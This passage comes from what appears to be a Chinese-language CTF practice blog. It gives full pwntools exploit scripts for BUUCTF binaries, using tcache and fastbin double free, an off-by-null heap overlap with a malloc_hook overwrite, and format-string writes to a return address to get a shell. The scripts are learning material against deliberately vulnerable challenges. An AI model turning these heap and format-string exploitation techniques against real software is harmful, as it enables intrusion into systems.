punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'onegadget => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>__malloc_hook<span class="token number">-0x23</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(io)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xb</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>__libc_realloc<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="0x9-安恒四月赛sales-office-libc2-29"><a href="#0x9-安恒四月赛sales-office-libc2-29" class="headerlink" title="0x9.安恒四月赛sales_office(libc2.29)"></a>0x9.安恒四月赛sales_office(libc2.29)</h2><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/23.jpg" alt=""></p><p>got表可写，无PIE</p><p>程序的存储结构类似于content(0x20)–&gt;chunk,即系统分配一个0x20大小的chunk，存储着用户分配的chunk的地址。这道题一共有两个环境，一个2.27的，由于存在uaf，2.27的利用非常简单，相对于2.27，2.29的tcache存在对doublefree的检测，所以难度更大了一些，但fastbin中依旧可以doublefree，所以我们只需要把tcache填满，在fastbin中进行doublefree即可，exp如下：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./sales_office'</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./sales_office'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># io = remote('das.wetolink.com', 28499)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./sales_office'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc-2.29.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'house:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'your house:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    dele<span class="token punctuation">(</span>i<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span>                <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(io)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="0xa-hitcon-2018-children-tcache"><a href="#0xa-hitcon-2018-children-tcache" class="headerlink" title="0xa.hitcon_2018_children_tcache"></a>0xa.hitcon_2018_children_tcache</h2><p>考察点:off-by-null</p><p>题目保护全开，但由于是2.27的libc，存在tcache，所以利用会简单些</p><p>漏洞点在new功能中输入data的函数</p><pre class=" language-c"><code class="language-c">  <span class="token keyword">signed</span> __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-4h]</span>  v3 <span class="token operator">=</span> <span class="token function">__read_chk</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> a1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"read error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  result <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v3 <span class="token operator">-</span> <span class="token number">1LL</span> <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_BYTE<span class="token punctuation">)</span>result <span class="token operator">==</span> <span class="token number">10</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    result <span class="token operator">=</span> v3 <span class="token operator">-</span> <span class="token number">1LL</span> <span class="token operator">+</span> a1<span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span></code></pre><p>最后会将空格换为null</p><p>所以我们可以通过off-by-one泄露地址，并构造出堆块复用，造成doublefree，攻击malloc_hook</p><p>exp如下</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./HITCON_2018_children_tcache'</span><span class="token comment" spellcheck="true">#io = process('./HITCON_2018_children_tcache')</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">28160</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'HITCON_2018_children_tcache'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 0</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># 1</span>add<span class="token punctuation">(</span><span class="token number">0x4f0</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 2</span>add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># 3</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token operator">-</span>i<span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x28</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># 0</span>    dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x540</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true"># 0</span>dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># 1</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3ebca0</span>free_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>__malloc_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>onegadget <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x4f322</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'free_hook => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'malloc_hook => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>__malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'onegadget => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>__malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>__malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>泄露地址的思路为：构造三个chunk，编号为0，1，2，通过chunk1off-by-onechunk2，将chunk2的prevsize设置为chunk0+chunk1，并将其标志位清零，这样dele2就会将chunk012一起dele，dele chunk2之前我们需要先将chunk0dele，然后我们将chunk0申请回来，main_arena的地址就落到了chunk1上，而chunk1仍在使用状态，所以我们只需要show(1)就能泄露出libc地址，这里需要注意的是，dele函数在free掉相应的chunk后，会将数据段全部置为0xda，所以我们需要将chunk2的prevsize位(也就是chunk1的最后八字节)每次一字节清零，然后再进行offbynull。</p><p>有了地址之后我们就能算出其他函数在内存中的地址，然后我们再申请一个chunk1大小的chunk，即为chunk2(原本的chunk2已经被free)，这样chunk1和chunk2指向的是同一块地址，我们dele(1),dele(2)，就能造成doublefree，然后劫持malloc_hook即可getshell</p><h2 id="0xb-npuctf-2020-level2"><a href="#0xb-npuctf-2020-level2" class="headerlink" title="0xb.npuctf_2020_level2"></a>0xb.npuctf_2020_level2</h2><p>Ubuntu18的环境，一道格式化字符串在bss段上的题，除了canary其他保护全部开启.我最不擅长的类型就是格式化字符串，这种在bss段上的题目从来没做过，平常做的也都是一些简单的复写got表的题目，这道题目困扰了我很久，比赛最后一天才出来，先把exp贴上</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token comment" spellcheck="true">#io = process("./level2")</span><span class="token comment" spellcheck="true">#io=remote('ha1cyon-ctf.fun',30258)</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">28126</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'level2'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.27_x64.so'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"%6$p%7$p%9$p"</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>pro_base <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x830</span>libc_base <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">231</span>stack <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">232</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'pro_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>pro_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'stack => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>onegadget <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x4f322</span>offset0 <span class="token operator">=</span> stack <span class="token operator">&amp;</span> <span class="token number">0xffff</span>offset1 <span class="token operator">=</span> onegadget <span class="token operator">&amp;</span> <span class="token number">0xffff</span>offset2 <span class="token operator">=</span> <span class="token punctuation">(</span>onegadget <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'onegadget => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'offset0 => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>offset0<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'offset1 => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>offset1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'offset2 => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>offset2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>offset0<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c"</span><span class="token operator">+</span><span class="token string">"%9$hnxxxx\x00"</span><span class="token comment" spellcheck="true">#gdb.attach(io)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"xxxx"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>offset1<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c"</span><span class="token operator">+</span><span class="token string">"%35$hnxxxx\x00"</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"xxxx"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>offset0<span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c"</span><span class="token operator">+</span><span class="token string">"%9$hnxxxx\x00"</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"xxxx"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>offset2<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c"</span><span class="token operator">+</span><span class="token string">"%35$hnxxxx\x00"</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"xxxx"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"66666666\x00"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>程序可以无限次循环，直到输入66666666退出格式化字符串在bss段上的程序，无论输入多少个%p我们都得不到格式化字符串的偏移，这样的题目一般是在栈上找一条链，以此作为跳板修改rip的最后几个字节为onegadget,下面我们来看看这道题目首先我们要泄露libc地址，栈地址以及程序加载的基地址，这些在栈中都能找到相应的值加以运算就能得到</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/24.jpg" alt=""></p><p>通过这三个箭头指向的值我么能分别算出程序加载的基地址，libc基地址和栈地址，这三个值对应的偏移分别是6，7，9，偏移都是一个个试出来的程序加载地址和程序加载基地址的偏移都是固定的</p><p>我们只需要计算出偏移即可知道了三个地址之后，接着就要以栈中的某一条链作为跳板来修改rip了，这条链其实就在偏移为9的位置</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/25.jpg" alt=""></p><p><img 